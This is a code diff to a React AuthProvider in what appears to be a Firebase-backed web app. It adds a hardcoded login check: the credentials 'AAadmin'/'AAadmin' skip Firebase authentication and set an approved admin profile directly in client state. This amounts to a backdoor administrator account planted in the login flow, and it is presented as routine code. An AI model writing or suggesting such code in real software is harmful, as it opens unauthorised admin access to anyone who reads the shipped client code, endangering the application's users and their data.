@@ -99,6 +99,36 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
   const login = async (email: string, password: string, role: string) => {
     setLoading(true);
     try {
+      // Check for special admin credentials
+      if (email === 'AAadmin' && password === 'AAadmin') {
+        // Create a mock admin user for the special admin login
+        const mockAdminUser = {
+          uid: 'admin-special',
+          email: 'AAadmin',
+          displayName: 'Admin'
+        };
+        
+        // Set the user state directly
+        setUser({
+          uid: mockAdminUser.uid,
+          email: mockAdminUser.email,
+          displayName: mockAdminUser.displayName
+        });
+        
+        // Set admin profile
+        setProfile({
+          name: 'Admin',
+          role: 'admin',
+          location: 'Philippines',
+          profileImage: '',
+          approved: true
+        });
+        
+        setLoading(false);
+        return;
+      }
+      
+      // Regular Firebase authentication for other users
       const userCredential = await signInWithEmailAndPassword(auth, email, password);
       const firebaseUser = userCredential.user;
       
